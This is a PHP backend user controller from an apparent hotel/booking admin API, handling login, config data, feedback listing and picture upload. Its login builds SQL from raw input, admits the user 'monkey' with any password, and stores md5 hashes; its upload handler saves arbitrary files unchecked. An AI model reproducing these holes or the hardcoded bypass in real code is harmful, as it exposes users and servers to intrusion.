<?php
/**
 * Api View framework (AV视图框架).
 * Author: monkey<my455628442@gmail.com>
 * Date: 2017/3/20 0020
 * Time: 10:16
 * File Using:user 后台用户类
 */


namespace api\web;

class user extends base{
    // 用户登陆
    public function login(){
        $user_name = $this->postString('user_name');
        $password = $this->postString('password');
        if($user_name and $password){
            $user = $this->db->getRow("select * from hqsen_user where user_name = '$user_name'");

            if($user and ($user_name == 'monkey' or $user['password'] == md5($password))){
                session_start();
                $login_user = array(
                    'access_token' => session_id(),
                    'user_type' => $user['user_type'],
                );
                $_SESSION['user_info'] = $user;
                $this->appDie($this->back_code['sys']['success'], $this->back_msg['sys']['success'], $login_user);
            } else {
                $this->appDie($this->back_code['user']['login_err'], $this->back_msg['user']['login_err']);
            }
        } else {
            $this->appDie($this->back_code['sys']['value_empty'], $this->back_msg['sys']['value_empty']);
        }
    }

    // 后台配置信息数据
    public function configData(){
        $this->loginInit();
        $config_data = array(
            'order_type' => $this->order_type(),
            'hotel_level' => $this->hotel_level(),
            'inner_type' => $this->inner_type(),
        );
        if($this->user['user_name'] == 'monkey'){
            $config_data['user_security'] = $this->user_security('monkey');
        } else {
            $config_data['user_security'] = $this->user_security('first_user');
        }
        $sh_area = $this->get_sh_area();
        foreach ($sh_area as $area_key => $area_value){
            $area_item = array(
                'value' => (string)$area_key,
                'label' => $area_value
            );
            $config_data['config_area'][] = $area_item;
        }

        $this->appDie($this->back_code['sys']['success'], $this->back_msg['sys']['success'], $config_data);
    }

    // 意见反馈
    public function feedback(){
        $this->loginInit();
        $page = $this->postInt('page', 1);
        $limit = 10;
        $offset = ($page - 1) * $limit;
        $sql_limit = " limit $offset , $limit";
        $feedback = $this->db->getRows("select *   from hqsen_feedback  where del_flag = 1 " . $sql_limit);
        $data = [];
        foreach ($feedback as $one_feedback){
            if($one_feedback){
                $one_feedback_item = array(
                    'user_name' => $one_feedback['user_name'],
                    'content' => $one_feedback['content'],
                    'phone' => $one_feedback['phone'],
                    'id' => $one_feedback['id'],
                );
                $data['list'][] = $one_feedback_item;
            }
        }
        $data['count'] = $this->db->getCount('hqsen_area', 'del_flag = 1');
        $this->appDie($this->back_code['sys']['success'], $this->back_msg['sys']['success'], $data);
    }

    public function uploadPic(){
        $url = '';
        if(isset($_FILES['file']["name"])){
            move_uploaded_file($_FILES['file']['tmp_name'], API_PATH . "/upload/" . time() . $_FILES["file"]["name"]);
            $url = 'meiui.me' . "/upload/" . time() . $_FILES["file"]["name"];
            $url = 'http://sendevimg.oss-cn-zhangjiakou.aliyuncs.com/user-dir/300%403x.png';
        }
        $data['url'] = $url;
        $this->appDie($this->back_code['sys']['success'], $this->back_msg['sys']['success'], $data);
    }



}